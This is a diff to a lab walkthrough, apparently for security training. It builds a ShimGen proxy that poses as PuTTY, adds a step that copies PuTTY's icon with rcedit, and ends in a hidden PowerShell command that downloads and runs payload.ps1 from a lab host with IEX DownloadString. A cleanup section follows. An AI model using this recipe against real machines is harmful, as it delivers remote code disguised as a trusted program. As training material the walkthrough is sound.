@@ -117,10 +117,11 @@ Switch to your **Administrator PowerShell** terminal. Download the two tools fro
 ```powershell
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/shimgen.exe" -OutFile "C:\Users\Public\shimgen.exe"
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/strings.exe"  -OutFile "C:\Users\Public\strings.exe"
+Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/rcedit.exe"   -OutFile "C:\Users\Public\rcedit.exe"
+Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/putty.ico"    -OutFile "C:\Users\Public\putty.ico"
 cd C:\Users\Public
 ```
 
-<img width="822" height="229" alt="image" src="https://github.com/user-attachments/assets/701cb2d0-a16b-4b56-9de3-6ed3fe230b8f" />
 
 ---
 
@@ -129,7 +130,7 @@ cd C:\Users\Public
 This is ShimGen at its simplest. In the **Windows powershell terminal**, generate a shim that does nothing but redirect execution to `notepad.exe`:
 
 ```powershell
-.\shimgen.exe --path "notepad.exe" --output ".\test_basic.exe"
+.\shimgen.exe --path "C:\Windows\System32\notepad.exe" --output ".\test_basic.exe"
 .\test_basic.exe
 ```
 
@@ -148,7 +149,7 @@ The shim weighs approximately **14 KB** — a near-empty binary container. There
 Compare execution visibility directly. First, generate a shim *without* `--gui`:
 
 ```powershell
-.\shimgen.exe --path "powershell.exe" --command "-c `"Start-Sleep 2`"" --output ".\test_nogui.exe"
+.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command "-c `"Start-Sleep 2`"" --output ".\test_nogui.exe"
 .\test_nogui.exe
 ```
 
@@ -157,7 +158,7 @@ A black console window flashes on screen and disappears. For a victim, this is a
 Now generate the same shim *with* `--gui`:
 
 ```powershell
-.\shimgen.exe --path "powershell.exe" --command "-c `"Start-Sleep 2`"" --gui --output ".\test_gui.exe"
+.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command "-c `"Start-Sleep 2`"" --gui --output ".\test_gui.exe"
 .\test_gui.exe
 ```
 
@@ -176,7 +177,8 @@ Test-Path "C:\Program Files\PuTTY\putty.exe"
 Generate a shim that clones PuTTY's icon but runs `calc.exe` instead:
 
 ```powershell
-.\shimgen.exe --path "calc.exe" --icon "C:\Program Files\PuTTY\putty.exe" --gui --output ".\test_icon.exe"
+.\shimgen.exe --path "C:\Windows\System32\calc.exe" --gui --output ".\test_icon.exe"
+.\rcedit.exe ".\test_icon.exe" --set-icon "C:\Users\Public\putty.ico"
 ```
 
 Open **File Explorer** and navigate to `C:\Users\Public`. You will see `test_icon.exe` bearing the exact PuTTY terminal icon — blue, white, and yellow, pixel-for-pixel identical to the real SSH client in `Program Files`. Double-click it: the Windows Calculator opens.
@@ -195,7 +197,7 @@ The `--command` flag bakes arbitrary arguments directly into the shim binary at 
 Generate a shim that passes a visible command to PowerShell to confirm the injection:
 
 ```powershell
-.\shimgen.exe --path "powershell.exe" --command "-NoExit -c `"Write-Host 'Argument injected from inside the shim binary'`"" --output ".\test_cmd.exe"
+.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command "-NoExit -c `"Write-Host 'Argument injected from inside the shim binary'`"" --output ".\test_cmd.exe"
 .\test_cmd.exe
 ```
 
@@ -225,12 +227,15 @@ Scroll through the output. Among the binary scaffolding, you will find the exact
 With a clear understanding of each flag's effect, combine them into the final attack binary. This single command synthesises every technique explored in Phase 3:
 
 ```powershell
+.# Generate the proxy executable
 .\shimgen.exe `
-  --path    "powershell.exe" `
+  --path    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
   --command "-WindowStyle Hidden -ExecutionPolicy Bypass -c `"IEX(New-Object Net.WebClient).DownloadString('http://<UBUNTU_IP>:8001/payload.ps1')`"" `
-  --icon    "C:\Program Files\PuTTY\putty.exe" `
   --gui `
   --output  "C:\Users\Public\Desktop\putty.exe"
+
+# Apply the stolen PuTTY icon
+.\rcedit.exe "C:\Users\Public\Desktop\putty.exe" --set-icon "C:\Users\Public\putty.ico"
 ```
 
 Each flag maps directly back to a capability demonstrated in isolation during Phase 3:
@@ -395,11 +400,13 @@ Remove all lab artifacts and restore the endpoint to its original state.
 
 ```powershell
 # Remove the weaponized binary from the Desktop
-Remove-Item "C:\Users\Public\Desktop\putty.exe"    -Force
+Remove-Item "C:\Users\Public\Desktop\putty.exe"     -Force
 
 # Remove downloaded tools
 Remove-Item "C:\Users\Public\shimgen.exe"           -Force
 Remove-Item "C:\Users\Public\strings.exe"           -Force
+Remove-Item "C:\Users\Public\rcedit.exe"            -Force
+Remove-Item "C:\Users\Public\putty.ico"             -Force
 
 # Remove Phase 3 test binaries
 Remove-Item "C:\Users\Public\test_basic.exe"        -Force
